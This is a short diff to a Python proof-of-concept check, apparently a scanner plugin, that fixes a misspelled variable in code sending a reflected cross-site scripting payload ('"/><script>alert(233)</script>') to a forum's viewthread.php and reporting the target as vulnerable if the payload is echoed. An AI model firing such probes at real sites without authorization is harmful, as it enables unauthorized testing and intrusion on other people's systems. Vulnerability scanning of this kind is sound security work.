@@ -52,7 +52,7 @@ class Poc(ABPoc):
             verify_url = self.target + \
                 '/viewthread.php?tid="/><script>alert(233)</script>'
             req = urllib.request.Request(verify_url)
-            erify_urcontent = urllib.request.urlopen(req).read()
+            content = urllib.request.urlopen(req).read()
             if '"/><script>alert(233)</script>' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
